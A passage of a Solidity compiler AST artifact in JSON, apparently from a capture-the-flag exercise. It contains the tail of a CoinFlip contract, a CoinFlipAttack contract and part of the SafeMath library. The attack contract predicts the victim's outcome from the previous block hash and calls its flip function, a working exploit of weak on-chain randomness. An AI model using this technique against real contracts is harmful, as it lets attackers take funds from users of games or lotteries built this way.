																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 26,
															"id": 75,
															"nodeType": "Return",
															"src": "812:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 86,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "455:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 22,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "465:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 86,
												"src": "460:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 21,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "460:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "459:13:0"
									},
									"returnParameters": {
										"id": 26,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 25,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 86,
												"src": "489:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 24,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "489:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "488:6:0"
									},
									"scope": 87,
									"src": "446:453:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 88,
							"src": "174:728:0",
							"usedErrors": []
						}
					],
					"src": "33:869:0"
				},
				"id": 0
			},
			"contracts/CoinflipAttack.sol": {
				"ast": {
					"absolutePath": "contracts/CoinflipAttack.sol",
					"exportedSymbols": {
						"CoinFlip": [
							87
						],
						"CoinFlipAttack": [
							152
						],
						"SafeMath": [
							464
						]
					},
					"id": 153,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 89,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:1"
						},
						{
							"absolutePath": "contracts/Coinflip.sol",
							"file": "./Coinflip.sol",
							"id": 90,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 153,
							"sourceUnit": 88,
							"src": "27:24:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
							"id": 91,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 153,
							"sourceUnit": 465,
							"src": "53:110:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlipAttack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 152,
							"linearizedBaseContracts": [
								152
							],
							"name": "CoinFlipAttack",
							"nameLocation": "176:14:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "f32d251d",
									"id": 94,
									"mutability": "mutable",
									"name": "victimContract",
									"nameLocation": "214:14:1",
									"nodeType": "VariableDeclaration",
									"scope": 152,
									"src": "198:30:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$87",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"id": 93,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 92,
											"name": "CoinFlip",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 87,
											"src": "198:8:1"
										},
										"referencedDeclaration": 87,
										"src": "198:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$87",
											"typeString": "contract CoinFlip"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 97,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "241:6:1",
									"nodeType": "VariableDeclaration",
									"scope": 152,
									"src": "233:94:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 95,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "233:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 96,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "250:77:1",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 108,
										"nodeType": "Block",
										"src": "385:62:1",
										"statements": [
											{
												"expression": {
													"id": 106,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 102,
														"name": "victimContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 94,
														"src": "392:14:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$87",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 104,
																"name": "_victimContractAddress",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 99,
																"src": "418:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 103,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 87,
															"src": "409:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$87_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 105,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "409:32:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$87",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "392:49:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$87",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 107,
												"nodeType": "ExpressionStatement",
												"src": "392:49:1"
											}
										]
									},
									"id": 109,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 100,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 99,
												"mutability": "mutable",
												"name": "_victimContractAddress",
												"nameLocation": "354:22:1",
												"nodeType": "VariableDeclaration",
												"scope": 109,
												"src": "346:30:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 98,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "346:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "345:32:1"
									},
									"returnParameters": {
										"id": 101,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "385:0:1"
									},
									"scope": 152,
									"src": "334:113:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 150,
										"nodeType": "Block",
										"src": "491:215:1",
										"statements": [
											{
												"assignments": [
													115
												],
												"declarations": [
													{
														"constant": false,
														"id": 115,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "508:10:1",
														"nodeType": "VariableDeclaration",
														"scope": 150,
														"src": "500:18:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 114,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "500:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 125,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 122,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 119,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "539:5:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 120,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "539:12:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 121,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "554:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "539:16:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 118,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "529:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 123,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "529:27:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 117,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "521:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 116,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "521:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 124,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "521:36:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "500:57:1"
											},
											{
												"assignments": [
													127
												],
												"declarations": [
													{
														"constant": false,
														"id": 127,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "574:8:1",
														"nodeType": "VariableDeclaration",
														"scope": 150,
														"src": "566:16:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 126,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "566:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 134,
												"initialValue": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 132,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 130,
																"name": "blockValue",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 115,
																"src": "593:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"id": 131,
																"name": "FACTOR",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 97,
																"src": "604:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "593:17:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 129,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "585:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 128,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "585:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 133,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "585:26:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "566:45:1"
											},
											{
												"assignments": [
													136
												],
												"declarations": [
													{
														"constant": false,
														"id": 136,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "625:4:1",
														"nodeType": "VariableDeclaration",
														"scope": 150,
														"src": "620:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 135,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "620:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 143,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 139,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 137,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "632:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 138,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "644:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "632:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 141,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "655:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 142,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "632:28:1",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 140,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "648:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "620:40:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 147,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 136,
															"src": "689:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"id": 144,
															"name": "victimContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 94,
															"src": "669:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$87",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 146,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 86,
														"src": "669:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 148,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "669:25:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 149,
												"nodeType": "ExpressionStatement",
												"src": "669:25:1"
											}
										]
									},
									"functionSelector": "cde4efa9",
									"id": 151,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "462:4:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 110,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "466:2:1"
									},
									"returnParameters": {
										"id": 113,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 112,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 151,
												"src": "485:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 111,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "485:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "484:6:1"
									},
									"scope": 152,
									"src": "453:253:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 153,
							"src": "167:544:1",
							"usedErrors": []
						}
					],
					"src": "0:711:1"
				},
				"id": 1
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							464
						]
					},
					"id": 465,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 154,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "107:23:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "SafeMath",
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 155,
								"nodeType": "StructuredDocumentation",
								"src": "285:196:2",
								"text": " @dev Wrappers over Solidity's arithmetic operations.\n NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n now has built in overflow checking."
							},
							"fullyImplemented": true,
							"id": 464,
							"linearizedBaseContracts": [
								464
							],
							"name": "SafeMath",
							"nameLocation": "490:8:2",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 186,
										"nodeType": "Block",
										"src": "717:140:2",
										"statements": [
											{
												"id": 185,
												"nodeType": "UncheckedBlock",
												"src": "727:124:2",
												"statements": [
													{
														"assignments": [
															168
														],
														"declarations": [
															{
																"constant": false,
																"id": 168,
																"mutability": "mutable",
																"name": "c",
																"nameLocation": "759:1:2",
																"nodeType": "VariableDeclaration",
																"scope": 185,
																"src": "751:9:2",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 167,
																	"name": "uint256",
																	"nodeType": "ElementaryTypeName",
																	"src": "751:7:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"visibility": "internal"
															}
														],
														"id": 172,
														"initialValue": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 171,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 169,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 158,
																"src": "763:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"id": 170,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 160,
																"src": "767:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "763:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "751:17:2"
													},
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 175,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 173,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 168,
																"src": "786:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"id": 174,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 158,
																"src": "790:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "786:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 180,
														"nodeType": "IfStatement",
														"src": "782:28:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 176,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "801:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 177,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "808:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 178,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "800:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 166,
															"id": 179,
															"nodeType": "Return",
															"src": "793:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 181,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "832:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"id": 182,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 168,
																	"src": "838:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 183,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "831:9:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 166,
														"id": 184,
														"nodeType": "Return",
														"src": "824:16:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 156,
										"nodeType": "StructuredDocumentation",
										"src": "505:131:2",
										"text": " @dev Returns the addition of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 187,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryAdd",
									"nameLocation": "650:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 161,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 158,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "665:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 187,
												"src": "657:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 157,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "657:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 160,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "676:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 187,
												"src": "668:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 159,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "668:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "656:22:2"
									},
									"returnParameters": {
										"id": 166,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 163,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 187,
												"src": "702:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 162,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "702:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 165,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 187,
												"src": "708:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 164,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "708:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "701:15:2"
									},
									"scope": 464,
									"src": "641:216:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 214,
										"nodeType": "Block",
										"src": "1078:113:2",
										"statements": [
											{
												"id": 213,
												"nodeType": "UncheckedBlock",
												"src": "1088:97:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 201,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 199,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 192,
																"src": "1116:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"id": 200,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 190,
